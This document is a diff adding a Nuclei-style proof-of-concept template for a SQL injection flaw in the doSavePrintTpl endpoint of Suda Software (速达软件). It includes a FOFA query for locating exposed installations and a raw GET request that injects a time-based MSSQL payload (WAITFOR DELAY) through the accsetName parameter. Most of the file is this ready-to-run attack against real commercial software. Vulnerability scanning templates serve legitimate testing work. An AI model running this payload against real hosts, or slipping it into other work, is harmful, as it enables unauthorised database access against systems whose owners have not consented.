@@ -1,0 +1,23 @@
+id: poc-guwx1nylmzie7g3r
+info:
+  name: 速达软件 doSavePrintTpl 存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/guwx1nylmzie7g3r'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: guwx1nylmzie7g3r
+    fofa: body="速达软件技术"
+http:
+- raw:
+  - 'GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1
+
+    Content-Type: application/json
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
